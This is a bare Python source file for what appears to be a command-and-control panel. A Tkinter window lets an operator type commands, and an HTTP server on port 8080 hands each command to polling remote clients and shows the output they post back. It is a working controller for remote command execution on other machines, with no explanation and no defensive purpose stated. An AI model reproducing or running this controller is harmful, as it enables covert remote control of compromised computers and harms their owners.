import tkinter as tk
from tkinter.scrolledtext import ScrolledText
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs
import subprocess
import threading

class MyHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        command = app.get_command()
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(bytes(command, "utf-8"))

    def do_POST(self):
        content_length = int(self.headers["Content-Length"])
        post_data = self.rfile.read(content_length).decode("utf-8")
        post_data = parse_qs(post_data)
        app.update_output(post_data["result"][0])
        self.send_response(200)
        self.end_headers()

class App:
    def __init__(self, master):
        self.master = master
        self.text_box = ScrolledText(master)
        self.text_box.pack()
        self.entry = tk.Entry(master)
        self.entry.pack()
        self.command = ""

    def get_command(self):
        self.command = self.entry.get()
        self.entry.delete(0, tk.END)
        return self.command

    def update_output(self, output):
        self.text_box.insert(tk.END, output)

def run_server():
    server = HTTPServer(("0.0.0.0", 8080), MyHandler)
    server.serve_forever()

root = tk.Tk()
app = App(root)
t = threading.Thread(target=run_server)
t.start()
root.mainloop()
